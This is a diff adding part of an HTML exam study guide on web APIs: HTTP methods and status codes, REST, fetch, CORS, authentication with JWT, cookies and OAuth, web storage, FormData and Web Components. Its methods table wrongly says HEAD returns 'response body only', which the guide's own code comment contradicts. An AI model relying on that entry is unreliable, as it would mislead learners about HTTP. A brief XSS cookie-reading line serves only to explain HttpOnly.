@@ -1,0 +1,2560 @@
+<h2 class="g-h2">Study Guide 08 — Web APIs &amp; Other Topics</h2>
+
+<p><strong>Goal: 100% on the final exam.</strong> This guide covers every topic in glossary section H and all miscellaneous topics not in the other 7 study guides (CSS, JS/TS, React, State, Next.js, Forms, Socket.io).</p>
+
+<h2 class="g-h2">Table of Contents</h2>
+<ol>
+  <li>HTTP Methods &amp; Status Codes</li>
+  <li>REST Principles</li>
+  <li>Fetch API (Deep Dive)</li>
+  <li>CORS</li>
+  <li>Authentication: JWT, Sessions, Cookies, OAuth</li>
+  <li>Web Storage: localStorage vs sessionStorage vs Cookies</li>
+  <li>FormData API</li>
+  <li>Web Components</li>
+  <li>HTML5 APIs: Web Workers, Drag and Drop</li>
+  <li>DOM Manipulation (from practice exams)</li>
+  <li>Security: XSS &amp; CSRF</li>
+  <li>Accessibility (ARIA, Semantic HTML, Keyboard Nav)</li>
+  <li>Performance (Lazy Loading, Code Splitting, Memoization)</li>
+  <li>SEO Basics</li>
+  <li>Testing (Jest &amp; React Testing Library)</li>
+  <li>Service Workers / PWA Basics</li>
+  <li>Topics Not Covered Elsewhere</li>
+  <li>Key Defaults &amp; Must-Memorize Tables</li>
+  <li>Likely Exam Questions</li>
+  <li>Cheat Sheet</li>
+</ol>
+
+<h2 class="g-h2">1. HTTP Methods &amp; Status Codes</h2>
+
+<h3 class="g-h3">HTTP Methods</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Method</th>
+      <th>Purpose</th>
+      <th>Has Body?</th>
+      <th>Idempotent?</th>
+      <th>Safe?</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>GET</strong></td>
+      <td>Retrieve data</td>
+      <td>No</td>
+      <td>Yes</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td><strong>POST</strong></td>
+      <td>Create new resource</td>
+      <td>Yes</td>
+      <td>No</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><strong>PUT</strong></td>
+      <td>Replace entire resource</td>
+      <td>Yes</td>
+      <td>Yes</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><strong>PATCH</strong></td>
+      <td>Partially update resource</td>
+      <td>Yes</td>
+      <td>No</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><strong>DELETE</strong></td>
+      <td>Delete resource</td>
+      <td>No (usually)</td>
+      <td>Yes</td>
+      <td>No</td>
+    </tr>
+    <tr>
+      <td><strong>HEAD</strong></td>
+      <td>Like GET but response body only (used by Next.js Route Handlers)</td>
+      <td>No</td>
+      <td>Yes</td>
+      <td>Yes</td>
+    </tr>
+    <tr>
+      <td><strong>OPTIONS</strong></td>
+      <td>Describe communication options (CORS preflight)</td>
+      <td>No</td>
+      <td>Yes</td>
+      <td>Yes</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p><strong>Next.js Route Handlers support:</strong> <code>GET</code>, <code>POST</code>, <code>PUT</code>, <code>PATCH</code>, <code>DELETE</code>, <code>HEAD</code>, <code>OPTIONS</code></p>
+<p><strong>Server Functions use:</strong> HTTP POST only (the ONLY way to invoke them)</p>
+
+<h4 class="g-h4">Example — fetch() for every HTTP method</h4>
+<div class="cb"><pre>// GET — no body, just retrieve
+const res = await fetch('/api/users/42');
+const user = await res.json();
+
+// POST — create a new resource, send JSON body
+const res = await fetch('/api/users', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ name: 'Alice', email: 'alice@example.com' }),
+});
+// Expect 201 Created
+
+// PUT — replace the whole resource
+const res = await fetch('/api/users/42', {
+  method: 'PUT',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ name: 'Alice Updated', email: 'alice@example.com' }),
+});
+
+// PATCH — update only specific fields
+const res = await fetch('/api/users/42', {
+  method: 'PATCH',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ email: 'newemail@example.com' }),
+});
+
+// DELETE — remove a resource (usually no body)
+const res = await fetch('/api/users/42', { method: 'DELETE' });
+// Expect 204 No Content
+
+// HEAD — same as GET but response has no body (check if resource exists)
+const res = await fetch('/api/users/42', { method: 'HEAD' });
+console.log(res.status); // 200 or 404
+
+// OPTIONS — preflight; browser sends this automatically (rarely called manually)
+const res = await fetch('/api/users', { method: 'OPTIONS' });</pre></div>
+
+<h3 class="g-h3">HTTP Status Codes — Must Know</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Code</th>
+      <th>Name</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>200</strong></td>
+      <td>OK</td>
+      <td>Success. Used for GET responses</td>
+    </tr>
+    <tr>
+      <td><strong>201</strong></td>
+      <td>Created</td>
+      <td>Resource successfully created. Used for POST</td>
+    </tr>
+    <tr>
+      <td><strong>204</strong></td>
+      <td>No Content</td>
+      <td>Success, but no body returned. Used for DELETE</td>
+    </tr>
+    <tr>
+      <td><strong>301</strong></td>
+      <td>Moved Permanently</td>
+      <td>Redirect — URL changed forever. Browser caches this</td>
+    </tr>
+    <tr>
+      <td><strong>302</strong></td>
+      <td>Found / Temporary Redirect</td>
+      <td>Redirect — URL temporarily changed</td>
+    </tr>
+    <tr>
+      <td><strong>400</strong></td>
+      <td>Bad Request</td>
+      <td>Client sent invalid data</td>
+    </tr>
+    <tr>
+      <td><strong>401</strong></td>
+      <td>Unauthorized</td>
+      <td>Not authenticated (not logged in)</td>
+    </tr>
+    <tr>
+      <td><strong>403</strong></td>
+      <td>Forbidden</td>
+      <td>Authenticated but not authorized (no permission)</td>
+    </tr>
+    <tr>
+      <td><strong>404</strong></td>
+      <td>Not Found</td>
+      <td>Resource does not exist</td>
+    </tr>
+    <tr>
+      <td><strong>409</strong></td>
+      <td>Conflict</td>
+      <td>Request conflicts with server state (e.g., duplicate email)</td>
+    </tr>
+    <tr>
+      <td><strong>500</strong></td>
+      <td>Internal Server Error</td>
+      <td>Server crashed or unexpected error</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p><strong>Memory trick for 4xx vs 5xx:</strong> 4xx = client's fault, 5xx = server's fault</p>
+<p><strong>Critical distinction — 401 vs 403:</strong></p>
+<ul>
+  <li>401: "I don't know who you are" — no auth token / not logged in</li>
+  <li>403: "I know who you are, but you can't do this" — insufficient permissions</li>
+</ul>
+
+<h4 class="g-h4">Example — what triggers each status code</h4>
+<div class="cb"><pre>// 200 OK — successful GET
+GET /api/users/42  →  { "id": 42, "name": "Alice" }
+
+// 201 Created — POST succeeded and resource now exists
+POST /api/users  →  { "id": 43, "name": "Bob" }
+// Location: /api/users/43
+
+// 204 No Content — DELETE succeeded, nothing to return
+DELETE /api/users/42  →  (empty body)
+
+// 301 Moved Permanently — old URL, browser caches redirect forever
+GET /old-page  →  Location: /new-page  (cached by browser)
+
+// 302 Found / Temporary Redirect — URL moved temporarily
+GET /sale  →  Location: /sale-2024  (not cached)
+
+// 400 Bad Request — client sent malformed data
+POST /api/users  body: { "email": "not-an-email" }
+→  { "error": "Invalid email format" }
+
+// 401 Unauthorized — no token / not logged in
+GET /api/profile  (no Authorization header)
+→  { "error": "Authentication required" }
+
+// 403 Forbidden — logged in but lacks permission
+DELETE /api/users/1  (logged in as regular user, not admin)
+→  { "error": "Insufficient permissions" }
+
+// 404 Not Found — resource doesn't exist
+GET /api/users/9999
+→  { "error": "User not found" }
+
+// 409 Conflict — email already taken
+POST /api/users  body: { "email": "alice@example.com" }
+→  { "error": "Email already registered" }
+
+// 500 Internal Server Error — bug or crash on server
+GET /api/users  (database connection failed on server)
+→  { "error": "Internal server error" }</pre></div>
+
+<h2 class="g-h2">2. REST Principles</h2>
+
+<p><strong>REST</strong> = Representational State Transfer</p>
+
+<h3 class="g-h3">The 6 REST Constraints</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Constraint</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Client-Server</strong></td>
+      <td>Separation of concerns. Client handles UI, server handles data</td>
+    </tr>
+    <tr>
+      <td><strong>Stateless</strong></td>
+      <td>Each request contains ALL information needed. No session on server</td>
+    </tr>
+    <tr>
+      <td><strong>Cacheable</strong></td>
+      <td>Responses must define if they're cacheable</td>
+    </tr>
+    <tr>
+      <td><strong>Uniform Interface</strong></td>
+      <td>Consistent resource naming (nouns, not verbs)</td>
+    </tr>
+    <tr>
+      <td><strong>Layered System</strong></td>
+      <td>Client doesn't know if talking to origin server or proxy</td>
+    </tr>
+    <tr>
+      <td><strong>Code on Demand</strong> (optional)</td>
+      <td>Server can send executable code to client</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">RESTful URL Conventions</h3>
+
+<div class="cb"><pre>GET    /users          → list all users
+POST   /users          → create a new user
+GET    /users/42       → get user with id 42
+PUT    /users/42       → replace user 42
+PATCH  /users/42       → partially update user 42
+DELETE /users/42       → delete user 42</pre></div>
+
+<p><strong>Key rules:</strong></p>
+<ul>
+  <li>Use <strong>nouns</strong> not verbs (<code>/users</code> not <code>/getUsers</code>)</li>
+  <li>Use <strong>plural</strong> for collections</li>
+  <li>Use <strong>HTTP methods</strong> to convey action</li>
+  <li>Nested resources: <code>/users/42/posts</code></li>
+</ul>
+
+<h2 class="g-h2">3. Fetch API (Deep Dive)</h2>
+
+<h3 class="g-h3">Core Behavior</h3>
+
+<div class="cb"><pre>// fetch() always returns a Promise that resolves to a Response object
+const response = await fetch('/api/users');</pre></div>
+
+<h3 class="g-h3">Critical Facts — These Appear on Exams</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Fact</th>
+      <th>Detail</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>fetch() returns</strong></td>
+      <td>A Promise that resolves to a <code>Response</code> object</td>
+    </tr>
+    <tr>
+      <td><strong>response.ok</strong></td>
+      <td><code>true</code> if status is 200-299, <code>false</code> otherwise</td>
+    </tr>
+    <tr>
+      <td><strong>response.json()</strong></td>
+      <td>Returns a <strong>Promise</strong> — you MUST await it</td>
+    </tr>
+    <tr>
+      <td><strong>response.text()</strong></td>
+      <td>Returns a <strong>Promise</strong> — for plain text bodies</td>
+    </tr>
+    <tr>
+      <td><strong>404 does NOT reject</strong></td>
+      <td>fetch resolves on 404! You must check <code>response.ok</code></td>
+    </tr>
+    <tr>
+      <td><strong>Network error DOES reject</strong></td>
+      <td>DNS failure, no internet, CORS block → fetch rejects</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">Common Bug Pattern (exam favorite!)</h3>
+
+<div class="cb"><pre>// BUG — missing await before response.json()
+async function loadUser(id: string) {
+  const response = await fetch(`/api/users/${id}`);
+  const data = response.json();  // ← returns Promise, NOT the data!
+  return data.name.toUpperCase(); // TypeError: Cannot read 'name' of Promise
+}
+
+// CORRECT
+async function loadUser(id: string): Promise&lt;string&gt; {
+  try {
+    const response = await fetch(`/api/users/${id}`);
+    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    const data: User = await response.json(); // ← awaited
+    return data.name.toUpperCase();
+  } catch (error) {
+    console.error('Failed to load user:', error);
+    throw error;
+  }
+}</pre></div>
+
+<h3 class="g-h3">Two Bugs to Always Identify</h3>
+
+<ol>
+  <li><strong>Missing <code>await</code> before <code>response.json()</code></strong> — returns a Promise instead of data</li>
+  <li><strong>No error handling</strong> — 404/500 responses are not caught; network errors crash silently</li>
+</ol>
+
+<h3 class="g-h3">fetch with Options</h3>
+
+<div class="cb"><pre>// POST request
+const response = await fetch('/api/users', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({ name: 'Alice', email: 'alice@example.com' }),
+});
+
+// With credentials (cookies sent cross-origin)
+const response = await fetch('/api/data', {
+  credentials: 'include',
+});</pre></div>
+
+<h3 class="g-h3">fetch in the Event Loop</h3>
+
+<ul>
+  <li><code>fetch()</code> is handled by <strong>Web APIs</strong> (browser-provided), not the main JS thread</li>
+  <li>When resolved, the callback goes to the <strong>Microtask Queue</strong> (via <code>.then()</code> / <code>await</code>)</li>
+  <li>Microtasks run BEFORE macrotasks (setTimeout)</li>
+</ul>
+
+<h2 class="g-h2">4. CORS</h2>
+
+<h3 class="g-h3">What is CORS?</h3>
+
+<p><strong>Cross-Origin Resource Sharing</strong> — a security mechanism that restricts web pages from making requests to a different origin (protocol + domain + port).</p>
+<p><strong>Same origin:</strong> <code>https://example.com:443</code> ← all three must match</p>
+
+<h3 class="g-h3">When is CORS triggered?</h3>
+
+<p>When a request goes to a <strong>different origin</strong> from the page's origin:</p>
+<ul>
+  <li><code>https://app.com</code> → <code>https://api.com</code> (different domain)</li>
+  <li><code>http://</code> → <code>https://</code> (different protocol)</li>
+  <li><code>https://app.com:3000</code> → <code>https://app.com:4000</code> (different port)</li>
+</ul>
+
+<h3 class="g-h3">Simple vs Preflight Requests</h3>
+
+<p><strong>Simple requests</strong> (no preflight): GET, HEAD, POST with <code>Content-Type: application/x-www-form-urlencoded | multipart/form-data | text/plain</code></p>
+<p><strong>Preflight request</strong> (OPTIONS request sent first): triggered when:</p>
+<ul>
+  <li>Method is PUT, DELETE, PATCH</li>
+  <li>Custom headers (like <code>Authorization</code>, <code>Content-Type: application/json</code>)</li>
+  <li>Request has credentials</li>
+</ul>
+
+<h3 class="g-h3">Preflight Flow</h3>
+
+<div class="cb"><pre>Browser → OPTIONS /api/data (preflight)
+         Headers: Origin, Access-Control-Request-Method, Access-Control-Request-Headers
+
+Server → 200 OK
+         Headers: Access-Control-Allow-Origin, Access-Control-Allow-Methods,
+                  Access-Control-Allow-Headers, Access-Control-Max-Age
+
+Browser → actual request (GET/POST/etc.)</pre></div>
+
+<h4 class="g-h4">Example — exact preflight request and server response headers</h4>
+<div class="cb"><pre>// 1. Browser sends preflight OPTIONS request (automatic, triggered by fetch below)
+fetch('https://api.example.com/data', {
+  method: 'DELETE',
+  headers: { 'Authorization': 'Bearer eyJ...' },
+});
+
+// ── Preflight request the browser sends ──────────────────────────────────
+OPTIONS /data HTTP/1.1
+Host: api.example.com
+Origin: https://app.example.com
+Access-Control-Request-Method: DELETE
+Access-Control-Request-Headers: Authorization
+
+// ── Server response to the preflight ─────────────────────────────────────
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://app.example.com
+Access-Control-Allow-Methods: GET, POST, DELETE, PUT, PATCH
+Access-Control-Allow-Headers: Authorization, Content-Type
+Access-Control-Allow-Credentials: true
+Access-Control-Max-Age: 86400
+
+// 2. After preflight is approved, browser sends the real DELETE request
+// 3. If server returns wrong/missing Access-Control-Allow-Origin → fetch() REJECTS</pre></div>
+
+<h3 class="g-h3">CORS Response Headers</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Header</th>
+      <th>Meaning</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>Access-Control-Allow-Origin: *</code></td>
+      <td>Allow any origin (no credentials)</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Origin: https://app.com</code></td>
+      <td>Allow specific origin</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Methods: GET, POST, PUT</code></td>
+      <td>Allowed HTTP methods</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Headers: Content-Type, Authorization</code></td>
+      <td>Allowed headers</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Credentials: true</code></td>
+      <td>Allow cookies/credentials</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Max-Age: 86400</code></td>
+      <td>Cache preflight for 24h</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">Credentials + CORS</h3>
+
+<ul>
+  <li>Cannot use <code>Access-Control-Allow-Origin: *</code> with credentials</li>
+  <li>Must specify exact origin AND <code>Access-Control-Allow-Credentials: true</code></li>
+  <li>Client must send <code>credentials: 'include'</code> in fetch options</li>
+</ul>
+
+<h3 class="g-h3">CORS Error — fetch rejects</h3>
+
+<p>A CORS error causes <code>fetch()</code> to <strong>reject</strong> (same as a network error). This is a browser security policy — the server response is blocked.</p>
+
+<h2 class="g-h2">5. Authentication: JWT, Sessions, Cookies, OAuth</h2>
+
+<h3 class="g-h3">Session-Based Authentication</h3>
+
+<div class="cb"><pre>1. User POSTs credentials
+2. Server validates, creates session in database
+3. Server sets cookie: Set-Cookie: sessionId=abc123; HttpOnly; Secure
+4. Browser sends cookie automatically on subsequent requests
+5. Server looks up session by ID on each request</pre></div>
+
+<p><strong>Pros:</strong> Easy to invalidate (just delete session from DB)<br>
+<strong>Cons:</strong> Server must store session state — not truly stateless</p>
+
+<h3 class="g-h3">JWT Authentication</h3>
+
+<p><strong>JWT</strong> = JSON Web Token — a self-contained token with 3 parts: <code>header.payload.signature</code></p>
+
+<div class="cb"><pre>eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0MiJ9.abc123signature</pre></div>
+
+<ul>
+  <li><strong>Header:</strong> Algorithm used (e.g., HS256)</li>
+  <li><strong>Payload:</strong> Claims (userId, role, expiry) — <strong>NOT encrypted, only Base64 encoded!</strong></li>
+  <li><strong>Signature:</strong> HMAC of header+payload using secret key</li>
+</ul>
+
+<h4 class="g-h4">Example — decoded JWT structure</h4>
+<div class="cb"><pre>// A real JWT looks like this (three Base64url segments separated by dots):
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+.eyJ1c2VySWQiOiI0MiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcxMzY3MDQwMCwiZXhwIjoxNzEzNjc0MDB9
+.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+
+// ── Decoded HEADER (Base64url → JSON) ───────────────────────────────────
+{
+  "alg": "HS256",   // signing algorithm
+  "typ": "JWT"
+}
+
+// ── Decoded PAYLOAD (Base64url → JSON) — NOT secret! Anyone can read this ──
+{
+  "userId": "42",
+  "role": "admin",
+  "iat": 1713670400,   // issued at (Unix timestamp)
+  "exp": 1713674000    // expires at (1 hour later)
+}
+
+// ── SIGNATURE ────────────────────────────────────────────────────────────
+// HMAC_SHA256(base64(header) + "." + base64(payload), SECRET_KEY)
+// Server verifies this — if tampered, signature won't match
+
+// Sending the JWT in a request:
+fetch('/api/profile', {
+  headers: { 'Authorization': 'Bearer eyJhbGci...' },
+});</pre></div>
+
+<div class="cb"><pre>1. User POSTs credentials
+2. Server validates, creates JWT with payload: { userId: 42, role: "admin" }
+3. Server returns JWT (stored in localStorage or httpOnly cookie)
+4. Client sends JWT in Authorization header: Bearer &lt;token&gt;
+5. Server validates signature — no DB lookup needed</pre></div>
+
+<p><strong>Pros:</strong> Stateless, scalable, works cross-domain<br>
+<strong>Cons:</strong> Cannot invalidate before expiry, payload is readable (don't put secrets in it)</p>
+
+<h3 class="g-h3">Token Storage — Where to store JWT?</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Location</th>
+      <th>XSS risk</th>
+      <th>CSRF risk</th>
+      <th>Notes</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>localStorage</strong></td>
+      <td>Yes (JS can read it)</td>
+      <td>No (not auto-sent)</td>
+      <td>Convenient but XSS-vulnerable</td>
+    </tr>
+    <tr>
+      <td><strong>sessionStorage</strong></td>
+      <td>Yes</td>
+      <td>No</td>
+      <td>Same as localStorage, cleared on tab close</td>
+    </tr>
+    <tr>
+      <td><strong>httpOnly Cookie</strong></td>
+      <td>No (JS cannot read)</td>
+      <td>Yes (auto-sent)</td>
+      <td>Most secure; pair with CSRF token</td>
+    </tr>
+    <tr>
+      <td><strong>Memory (JS variable)</strong></td>
+      <td>Low</td>
+      <td>No</td>
+      <td>Lost on page refresh</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">Cookie Attributes</h3>
+
+<div class="cb"><pre>Set-Cookie: token=abc;
+  HttpOnly;         ← JS cannot access (prevents XSS token theft)
+  Secure;           ← Only sent over HTTPS
+  SameSite=Strict;  ← Never sent cross-site (prevents CSRF)
+  Path=/;
+  Max-Age=3600</pre></div>
+
+<h4 class="g-h4">Example — real Set-Cookie header on server response</h4>
+<div class="cb"><pre>// Server sets this header after a successful login:
+HTTP/1.1 200 OK
+Set-Cookie: sessionId=a3f8b2c9d4e5; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600
+
+// What each attribute does:
+// sessionId=a3f8b2c9d4e5  → the cookie name and value
+// HttpOnly               → document.cookie cannot read it (blocks XSS theft)
+// Secure                 → only sent over HTTPS, never plain HTTP
+// SameSite=Strict        → browser never sends it with cross-site requests (blocks CSRF)
+// Path=/                 → sent for all paths on this domain
+// Max-Age=3600           → expires in 1 hour (3600 seconds)
+
+// Without HttpOnly: attacker XSS script can run:
+document.cookie  // "sessionId=a3f8b2c9d4e5" ← stolen!
+
+// With HttpOnly: document.cookie returns "" for that cookie — JS can't see it</pre></div>
+
+<p><strong>SameSite values:</strong></p>
+<ul>
+  <li><code>Strict</code> — cookie never sent cross-site</li>
+  <li><code>Lax</code> — cookie sent on top-level GET navigations only (default in modern browsers)</li>
+  <li><code>None</code> — always sent (requires Secure flag)</li>
+</ul>
+
+<h3 class="g-h3">OAuth 2.0 Basics</h3>
+
+<p>OAuth 2.0 is an <strong>authorization framework</strong> (not authentication) that lets users grant third-party apps access to their data without sharing passwords.</p>
+
+<p><strong>Flow (Authorization Code):</strong></p>
+
+<div class="cb"><pre>1. User clicks "Login with Google"
+2. App redirects to Google's authorization server
+3. User grants permission
+4. Google redirects back with authorization code
+5. App exchanges code for access token (server-to-server)
+6. App uses access token to call Google APIs</pre></div>
+
+<p><strong>Key terms:</strong></p>
+<ul>
+  <li><strong>Resource Owner:</strong> The user</li>
+  <li><strong>Client:</strong> Your app</li>
+  <li><strong>Authorization Server:</strong> Google/GitHub/etc.</li>
+  <li><strong>Resource Server:</strong> The API (e.g., Google Drive API)</li>
+  <li><strong>Access Token:</strong> Short-lived token to access resources</li>
+  <li><strong>Refresh Token:</strong> Long-lived token to get new access tokens</li>
+</ul>
+
+<h2 class="g-h2">6. Web Storage: localStorage vs sessionStorage vs Cookies</h2>
+
+<h3 class="g-h3">Comparison Table</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Feature</th>
+      <th>localStorage</th>
+      <th>sessionStorage</th>
+      <th>Cookie</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Persistence</strong></td>
+      <td>Until manually cleared</td>
+      <td>Until tab closes</td>
+      <td>Set by server (<code>Max-Age</code>/<code>Expires</code>)</td>
+    </tr>
+    <tr>
+      <td><strong>Capacity</strong></td>
+      <td>~5MB</td>
+      <td>~5MB</td>
+      <td>~4KB</td>
+    </tr>
+    <tr>
+      <td><strong>Accessible from JS</strong></td>
+      <td>Yes</td>
+      <td>Yes</td>
+      <td>Yes (unless <code>HttpOnly</code>)</td>
+    </tr>
+    <tr>
+      <td><strong>Sent with requests</strong></td>
+      <td>No</td>
+      <td>No</td>
+      <td>Yes (automatically)</td>
+    </tr>
+    <tr>
+      <td><strong>Same-origin</strong></td>
+      <td>Yes</td>
+      <td>Yes</td>
+      <td>Domain-configurable</td>
+    </tr>
+    <tr>
+      <td><strong>Server can set</strong></td>
+      <td>No</td>
+      <td>No</td>
+      <td>Yes (<code>Set-Cookie</code> header)</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">Web Storage API (same for both localStorage and sessionStorage)</h3>
+
+<div class="cb"><pre>// Store data (must stringify objects)
+localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));
+
+// Retrieve data (must parse JSON)
+const user = JSON.parse(localStorage.getItem('user'));
+
+// Remove item
+localStorage.removeItem('user');
+
+// Clear all
+localStorage.clear();</pre></div>
+
+<p><strong>Critical fact:</strong> Web Storage can only store <strong>strings</strong>. Objects must be serialized with <code>JSON.stringify()</code> and deserialized with <code>JSON.parse()</code>.</p>
+
+<h4 class="g-h4">Example — localStorage vs sessionStorage side by side</h4>
+<div class="cb"><pre>// ── localStorage — survives tab close, browser restart ────────────────────
+localStorage.setItem('theme', 'dark');
+console.log(localStorage.getItem('theme'));  // "dark" — still there tomorrow
+
+// Storing an object (must stringify):
+localStorage.setItem('user', JSON.stringify({ id: 42, name: 'Alice' }));
+const user = JSON.parse(localStorage.getItem('user'));
+console.log(user.name);  // "Alice"
+
+localStorage.removeItem('theme');  // remove one key
+localStorage.clear();              // wipe everything
+
+// ── sessionStorage — cleared when the tab closes ──────────────────────────
+sessionStorage.setItem('wizardStep', '3');
+console.log(sessionStorage.getItem('wizardStep'));  // "3"
+
+// Open a NEW tab → sessionStorage is empty there (not shared across tabs)
+// Close this tab → data is gone
+
+// ── Key difference in practice ───────────────────────────────────────────
+// localStorage:    user preferences, cached API responses, JWT (⚠ XSS risk)
+// sessionStorage:  multi-step form state, one-time UI state (e.g. wizard step)</pre></div>
+
+<h3 class="g-h3">Zustand persist middleware uses localStorage by default</h3>
+
+<div class="cb"><pre>// Zustand with sessionStorage
+create()(persist(
+  (set) =&gt; ({ ... }),
+  {
+    name: "cart-storage",
+    storage: createJSONStorage(() =&gt; sessionStorage) // override default
+  }
+));</pre></div>
+
+<h2 class="g-h2">7. FormData API</h2>
+
+<p><code>FormData</code> is used to send multipart/form-data (files + text fields) via fetch.</p>
+
+<div class="cb"><pre>// HTML form
+&lt;form onSubmit={handleSubmit}&gt;
+  &lt;input name="name" type="text" /&gt;
+  &lt;input name="avatar" type="file" /&gt;
+&lt;/form&gt;
+
+// Server Action receives FormData
+async function createUser(formData: FormData) {
+  const name = formData.get('name') as string;
+  const avatar = formData.get('avatar') as File;
+
+  // Validate
+  if (!name) return { error: 'Name required' };
+
+  // Save to DB
+  await db.user.create({ data: { name } });
+}</pre></div>
+
+<p><strong>Key methods:</strong></p>
+<ul>
+  <li><code>formData.get('fieldName')</code> — get single value</li>
+  <li><code>formData.getAll('fieldName')</code> — get multiple values (checkboxes)</li>
+  <li><code>formData.append('key', value)</code> — add a field</li>
+  <li><code>formData.set('key', value)</code> — set/overwrite a field</li>
+</ul>
+
+<p><strong>How Next.js Server Actions receive FormData:</strong> When a <code>&lt;form action={serverAction}&gt;</code> is submitted, Next.js automatically passes the form data as <code>FormData</code> to the server action.</p>
+
+<h4 class="g-h4">Example — sending a file upload with fetch + FormData</h4>
+<div class="cb"><pre>// HTML input
+&lt;input id="avatar" type="file" accept="image/*" /&gt;
+&lt;input id="username" type="text" value="Alice" /&gt;
+
+// JavaScript: build FormData manually and POST it
+async function uploadProfile() {
+  const formData = new FormData();
+  formData.append('username', document.getElementById('username').value);
+  formData.append('avatar', document.getElementById('avatar').files[0]);
+  // ↑ File object — FormData handles multipart encoding automatically
+
+  const res = await fetch('/api/profile', {
+    method: 'POST',
+    body: formData,
+    // DO NOT set Content-Type header manually!
+    // fetch sets it to multipart/form-data with the correct boundary automatically
+  });
+
+  if (!res.ok) throw new Error('Upload failed');
+  const data = await res.json();
+  console.log('Saved:', data.avatarUrl);
+}
+
+// On the server (Next.js Route Handler):
+export async function POST(request) {
+  const formData = await request.formData();
+  const username = formData.get('username');  // string
+  const avatar   = formData.get('avatar');    // File object
+  const bytes    = await avatar.arrayBuffer();
+  // ... save to storage
+}</pre></div>
+
+<h2 class="g-h2">8. Web Components</h2>
+
+<p>Web Components are a set of browser APIs for creating reusable custom HTML elements.</p>
+
+<h3 class="g-h3">The Three Technologies</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Technology</th>
+      <th>Purpose</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Custom Elements</strong></td>
+      <td>Define new HTML tags with custom behavior</td>
+    </tr>
+    <tr>
+      <td><strong>Shadow DOM</strong></td>
+      <td>Encapsulated DOM tree — styles don't leak in/out</td>
+    </tr>
+    <tr>
+      <td><strong>HTML Templates</strong></td>
+      <td><code>&lt;template&gt;</code> element — content not rendered until cloned</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">Custom Elements API</h3>
+
+<div class="cb"><pre>// 1. Define a class extending HTMLElement
+class MyCard extends HTMLElement {
+  // Called when element is added to the DOM
+  connectedCallback() {
+    this.innerHTML = `&lt;div class="card"&gt;${this.getAttribute('title')}&lt;/div&gt;`;
+  }
+
+  // Called when element is removed from DOM
+  disconnectedCallback() {
+    // cleanup
+  }
+
+  // Called when observed attribute changes
+  attributeChangedCallback(name, oldValue, newValue) {
+    this.render();
+  }
+
+  // Must declare which attributes to observe
+  static get observedAttributes() {
+    return ['title', 'description'];
+  }
+}
+
+// 2. Register the custom element (must contain a hyphen!)
+customElements.define('my-card', MyCard);</pre></div>
+
+<div class="cb"><pre>&lt;!-- 3. Use it like any HTML element --&gt;
+&lt;my-card title="Hello" description="World"&gt;&lt;/my-card&gt;</pre></div>
+
+<h3 class="g-h3">Shadow DOM</h3>
+
+<div class="cb"><pre>class MyComponent extends HTMLElement {
+  connectedCallback() {
+    // Create shadow root (isolated DOM tree)
+    const shadow = this.attachShadow({ mode: 'open' });
+
+    // Styles here don't affect the rest of the page
+    shadow.innerHTML = `
+      &lt;style&gt;
+        p { color: red; } /* only affects THIS component */
+      &lt;/style&gt;
+      &lt;p&gt;Hello from shadow DOM&lt;/p&gt;
+    `;
+  }
+}</pre></div>
+
+<p><strong>Key facts:</strong></p>
+<ul>
+  <li><code>mode: 'open'</code> — JS outside can access shadow DOM via <code>element.shadowRoot</code></li>
+  <li><code>mode: 'closed'</code> — shadow DOM is completely private</li>
+  <li>Custom element tag names <strong>must contain a hyphen</strong> (e.g., <code>my-card</code>, NOT <code>mycard</code>)</li>
+</ul>
